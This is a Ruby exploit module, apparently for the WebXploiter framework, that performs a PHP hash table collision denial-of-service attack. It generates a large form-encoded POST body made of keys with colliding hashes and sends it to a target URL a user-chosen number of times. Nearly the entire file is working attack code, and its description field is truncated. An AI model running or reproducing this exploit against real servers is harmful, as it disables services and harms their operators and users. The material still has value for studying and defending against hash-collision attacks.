class WebXploit < WXf::WXfmod_Factory::Exploit
require 'cgi'
include WXf::WXfassists::General::MechReq

def initialize
  super(
   'Name'        => 'PHP Hash Table Collision DoS',
   'Version'     => '1.0',
   'Description' => %q{
 	Hash table collision denial of service attack for PH
                    },
   'Author'      => [ 'John M. Poulin' ],
   'Reference'   => 'https://github.com/koto/blog-kotowicz-net-examples/blob/master/hashcollision/crash.php',
   'License'     => WXF_LICENSE
  )

  init_opts([
	OptString.new('COUNT', [true, "Number of requests", ""]),
  ])

end

def exploit

	if datahash['COUNT'].to_i <= 1
		prnt_gen("Please set COUNT > 1")
		return
	end

	prnt_gen("Generating Payload - This may take several minutes")
	payload = genPayload()

	i = 1

	while i <= datahash['COUNT'].to_i
	puts "Sending request \##{i}"

	res = mech_req({
            'method' => "POST",
            'RURL'=> rurl,
            'RPARAMS' => payload,
	    'HEADERS' => {'Content-Type' => "application/x-www-form-urlencoded"}
          })

	i = i+1
	end 

	prnt_gen("Exploit complete")
end

def genPayload
	post = ''
	# Colliding hash values taken from https://github.com/koto/blog-kotowicz-net-examples/blob/master/hashcollision/crash.php
	h = ['Ez', 'FY', 'G8', 'H' + 23.chr(), 'D' + 155.chr()]

	# Set length of payload to 7
	len = 7
	
	max = h.length ** len
	
	i = 0
	while i < max
		tmp = i.to_s(h.length)
		s = tmp.rjust(len, '0')
	
	
		h.each_index { |x| 	
			s.gsub!(x.to_s, h.fetch(x.to_i).to_s)
 		}

		post = post + CGI.escape(s).to_s + "=&"
		i += 1
	end
return post

end
end
